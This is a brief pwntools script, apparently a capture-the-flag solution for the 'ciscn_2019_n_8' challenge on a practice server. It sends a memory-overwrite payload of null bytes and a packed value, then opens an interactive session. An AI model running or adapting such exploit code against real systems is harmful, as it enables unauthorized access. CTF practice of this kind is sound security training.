from pwn import *

# io = process('ciscn_2019_n_8')
io = remote('node4.buuoj.cn', 29014)

payload = b'\x00' * 52 + p64(17)
io.sendline(payload)
io.interactive()
